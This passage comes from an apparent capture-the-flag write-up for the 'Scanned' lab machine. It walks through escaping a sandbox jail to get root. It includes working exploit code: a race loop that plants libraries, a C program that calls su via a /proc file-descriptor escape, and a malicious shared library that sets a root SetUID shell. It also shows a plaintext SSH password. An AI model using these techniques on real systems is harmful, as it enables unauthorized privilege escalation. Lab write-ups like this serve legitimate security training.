At first I’ll try something like this:

```

clarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /usr/bin/id a & cp /lib/x86_64-linux-gnu/libselinux.so.1 jails/a/usr/lib/; echo "copied lib"
[1] 123261
cp: cannot create regular file 'jails/a/usr/lib/': No such file or directory
copied lib
clarence@scanned:/var/www/malscanner/sandbox$ <program name unknown>: error while loading shared libraries: libselinux.so.1: cannot open shared object file: No such file or directory
Exited

```

It’s going to start `sandbox` in the background and then copy the library in. The error shows that the copy fails because the jail library doesn’t exist yet. I’ll add a loop that waits for the jail directory to exist and then does the copy. That code with whitespace looks like:

```

./sandbox /usr/bin/id a & 
until [ -d jails/a ]; do 
	sleep 0.01; 
done; 
cp /lib/x86_64-linux-gnu/libselinux.so.1 jails/a/usr/lib/; 
echo "copied lib"

```

One time I’ll get it partially copied before it’s read:

```

clarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /usr/bin/id a & until [ -d jails/a ]; do sleep 0.01; done; cp /lib/x86_64-linux-gnu/libselinux.so.1 jails/a/usr/lib/; echo "copied lib"
[2] 123227
[1]   Exit 255                ./sandbox /usr/bin/id a
<program name unknown>: error while loading shared libraries: /usr/lib/libselinux.so.1: file too short
Exited
copied lib

```

The “file too short” error suggests it wasn’t done being copied. After a few tries, it will work:

```

clarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /usr/bin/id a & until [ -d jails/a ]; do sleep 0.01; done; cp /lib/x86_64-linux-gnu/libselinux.so.1 jails/a/usr/lib/; echo "copied lib"
[1] 123244
copied lib
<program name unknown>: error while loading shared libraries: libpcre2-8.so.0: cannot open shared object file: No such file or directory
Exited

```

`id` still failed with an error for another missing library, but it does show that if I can copy a library into the jail, it will be used by the `userprog` running in that jail.

### Strategy

I’m going to abuse the `sandbox` application again. All these capabilities are all dropped before my code gets run, and even before the `fork` calls, so all three processes are running without these capabilities. However, if I use my binary to run something that is set to SetUID, then that process will be running as root. There are no SetUID binaries in the jail, but I already showed I can access files outside the jail using the file descriptor in PIDs 1 or 3.

I’ve also shown that I can copy libraries into the jail and have those used.

Putting this all together, I’ll write two binaries. The first is a malicious executable that will:
- Sleep for a second to allow me time to load libraries into the jail.
- Exploit the file descriptor to call a SetUID binary using `popen`.

The second is a malicious library that is loaded by the SetUID binary called by the executable. If I can get this library into the jail while the loader sleeps, then when the SetUID binary runs, it will run my malicious library, giving execution as root.

### Binary to Launch su

#### Write and Compile Binary

I’ll write a binary that will sleep and then launch `su` using the same trick I used to get a foothold:

```

#include <stdio.h>
#include <unistd.h>

int main() {

    sleep(3);

    size_t bytesRead = 0;

    FILE *run = popen("/proc/1/fd/3/../../../../../../../usr/bin/su", "r");
    char buf[1000] = {0};

    while ((bytesRead = fread(buf, sizeof(buf), 1, run)) > 0) {
        printf("%s", buf);
    }

    pclose(run);
}

```

Very much like the original exploit, except this time instead of reading a file, I’ll use `popen` to run a process, and I’ll use the `/proc` trick to get `su` from outside the jail. This time I don’t have to worry about seeing the results through the `log` file, so I’ll just print the results to the screen.

I’ll compile this and upload it to Scanned:

```

oxdf@hacky$ gcc runsu.c -o runsu
oxdf@hacky$ sshpass -p 'onedayyoufeellikecrying' scp runsu clarence@10.10.11.141:/dev/shm

```

#### Run It

If I run this via `sandbox`, it reports that it can’t find `libpam.so.0`:

```

clarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /dev/shm/runsu a 
/proc/1/fd/3/../../../../../../../usr/bin/su: error while loading shared libraries: libpam.so.0: cannot open shared object file: No such file or directory
Exited
Kill err: (3)

```

This is the first of several imports that are required. These imports are not required by my binary:

```

clarence@scanned:/var/www/malscanner/sandbox$ ldd /dev/shm/runsu 
        linux-vdso.so.1 (0x00007ffdaa7fc000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5e6b3b6000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f5e6b587000)

```

`linux-vdso.so.1` is a virtual file that’s not on the disk, but [actually part of the kernel](https://stackoverflow.com/questions/58657036/where-is-linux-vdso-so-1-present-on-the-file-system). `libc.so.6` and `ld-linux-x86-64.so.2` were the two files copied into the jail.

Looking at `su`, it requires more (the first being `libpam.so.0` which is where it’s failing):

```

clarence@scanned:/var/www/malscanner/sandbox$ ldd /usr/bin/su
        linux-vdso.so.1 (0x00007ffff6cb3000)
        libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007f83c279e000)
        libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007f83c2799000)
        libutil.so.1 => /lib/x86_64-linux-gnu/libutil.so.1 (0x00007f83c2794000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f83c25cf000)
        libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007f83c259e000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f83c2598000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f83c27ca000)
        libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007f83c258e000)
        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f83c256c000)

```

#### Run with Fixed Libs

I’ll use a similar loop to last time, except this time I can sleep longer because I have the 3 second sleep at the start of `runsu`. I’ll copy all the libs into the jail to be lazy/safe:

```

clarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /dev/shm/runsu a & until [ -d jails/a ]; do sleep 1; done; cp -r /lib/x86_64-linux-gnu/* jails/a/usr/lib/; echo "copied libs"
[1] 124255
copied libs
su: user root does not exist or the user entry does not contain all the required fields
Exited
Kill err: (3)

```

This time it runs! It errors out in the `su` call, but that looks like `su` being called.

### Malicious Library File

#### Write and Compile Library

My library will be very simple. It only has a constructor that is called when the library loads, and that `init` function will go outside the jail and modify `/tmp/0xdf` to be owned by root and SetUID (4777):

```

#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>

static __attribute__ ((constructor)) void init(void) {

    char fn[120] = "/proc/1/fd/3/../../../../../../../../tmp/0xdf";
    char mode[] = "4777";
    int mode_int = strtol(mode, 0, 8);
    chown(fn, 0, 0);
    chmod(fn, mode_int);
}

```

I’ll compile this as a shared object (library) file and upload it to Scanned:

```

oxdf@hacky$ gcc -shared -fPIC -o setuidlib.so setuidlib.c 
oxdf@hacky$ gcc -shared -fPIC -o setuidlib.so setuidlib.c 

```

#### Failure

I’ll run the same loop as before, but this time, after copying all the libraries into the jail, I’ll copy my library on top of `libpam.so.0` with this command:

```

./sandbox /dev/shm/runsu a &
until [ -d jails/a ]; do 
  sleep 1; 
done 
cp -r /lib/x86_64-linux-gnu/* jails/a/usr/lib/
cp /dev/shm/setuidlib.so jails/a/usr/lib/libpam.so.0
echo "copied libs"

```

When I run that, it errors out:

```

clarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /dev/shm/runsu a & until [ -d jails/a ]; do sleep 1; done; cp -r /lib/x86_64-linux-gnu/* jails/a/usr/lib/; cp /dev/shm/setuidlib.so jails/a/usr/lib/libpam.so.0; echo "copied libs"
[1] 124277
copied libs
clarence@scanned:/var/www/malscanner/sandbox$ /proc/1/fd/3/../../../../../../../usr/bin/su: /lib/libpam.so.0: no version information available (required by /proc/1/fd/3/../../../../../../../usr/bin/su)
/proc/1/fd/3/../../../../../../../usr/bin/su: /lib/libpam.so.0: no version information available (required by /lib/libpam_misc.so.0)
/proc/1/fd/3/../../../../../../../usr/bin/su: symbol lookup error: /lib/libpam_misc.so.0: undefined symbol: pam_putenv, version LIBPAM_1.0
Exited
Kill err: (3)

```

It’s complaining that there’s no version information in my library, and that `libpam_misc.so.0` requires it. It’s also complaining that `libpam_misc.so.0` needs the `pam_putenv` method from `libpam.so.0`.

I could go down trying to fix these by implementing the version info and the `pam_putenv` function (described [here](https://man7.org/linux/man-pages/man3/pam_putenv.3.html)).

Instead, I’ll try overwriting the `libpam_misc.so.0` library instead, on the idea that this “misc” library may provide less critical purpose to `su`.

```

clarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /dev/shm/runsu a & until [ -d jails/a ]; do sleep 1; done; cp -r /lib/x86_64-linux-gnu/* jails/a/usr/lib/; cp /dev/shm/setuidlib.so jails/a/usr/lib/libpam_misc.so.0; echo "copied libs"
[1] 124368
copied libs
clarence@scanned:/var/www/malscanner/sandbox$ /proc/1/fd/3/../../../../../../../usr/bin/su: /lib/libpam_misc.so.0: no version information available (required by /proc/1/fd/3/../../../../../../../usr/bin/su)
/proc/1/fd/3/../../../../../../../usr/bin/su: symbol lookup error: /proc/1/fd/3/../../../../../../../usr/bin/su: undefined symbol: misc_conv, version LIBPAM_MISC_1.0
Exited
Kill err: (3)

```

This time is still missing the version info, but no library is complaining about it’s not being there. There is a symbol look up error for the `misc_conv` function: “undefined symbol: misc\_conv, version LIBPAM\_MISC\_1.0”

#### Add misc\_conv Function

The definition for this function is [here](https://man7.org/linux/man-pages/man3/misc_conv.3.html):

```

       int misc_conv(int num_msg, const struct pam_message **msgm,
                     struct pam_response **response, void *appdata_ptr);

```

I’ll add this to the library, and just have it return 1:

```

#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>

int misc_conv(int num_msg, const struct pam_message **msgm, struct pam_response **response, void *appdata_ptr) {
    return 1;
}

static __attribute__ ((constructor)) void init(void) {

    char fn[120] = "/proc/1/fd/3/../../../../../../../../tmp/0xdf";
    char mode[] = "4777";
    int mode_int = strtol(mode, 0, 8);
    chown(fn, 0, 0);
    chmod(fn, mode_int);
}

```

When I compile it, there are warnings for unknown types, but that’s ok:

```

oxdf@hacky$ gcc -shared -fPIC -o setuidlib.so setuidlib.c 
setuidlib.c:5:68: warning: ‘struct pam_response’ declared inside parameter list will not be visible outside of this definition or declaration
    5 | int misc_conv(int num_msg, const struct pam_message **msgm, struct pam_response **response, void *appdata_ptr) {
      |                                                                    ^~~~~~~~~~~~
setuidlib.c:5:41: warning: ‘struct pam_message’ declared inside parameter list will not be visible outside of this definition or declaration
    5 | int misc_conv(int num_msg, const struct pam_message **msgm, struct pam_response **response, void *appdata_ptr) {
      | 

```

I’ll upload it to Scanned:

```

oxdf@hacky$ sshpass -p 'onedayyoufeellikecrying' scp setuidlib.so clarence@10.10.11.141:/dev/shm

```

#### Success

I’ll run again, updating `libpam_misc.so.0` with `setuidlib.so`:

```

clarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /dev/shm/runsu a & until [ -d jails/a ]; do sleep 1; done; cp -r /lib/x86_64-linux-gnu/* jails/a/usr/lib/; cp /dev/shm/setuidlib.so jails/a/usr/lib/libpam_misc.so.0; echo "copied libs"
[1] 124401
copied libs
/proc/1/fd/3/../../../../../../../usr/bin/su: /lib/libpam_misc.so.0: no version information available (required by /proc/1/fd/3/../../../../../../../usr/bin/su)
su: user root does not exist or the user entry does not contain all the required fields
Exited
Kill err: (3)

```

The results look good! It seems to have run. And `/tmp/0xdf` is now SetUID:

```

clarence@scanned:/var/www/malscanner/sandbox$ ls -l /tmp/0xdf 
-rwsrwxrwx 1 root root 1234376 Sep  8 18:57 /tmp/0xdf

```

I’ll run it (remembering `-p` to not drop privs) and get a root shell:

```

clarence@scanned:/var/www/malscanner/sandbox$ /tmp/0xdf -p
0xdf-5.1# id
uid=1000(clarence) gid=1000(clarence) euid=0(root) groups=1000(clarence)

```

And `root.txt`:

```

0xdf-5.1# cat /root/root.txt
ba0f4c36************************

```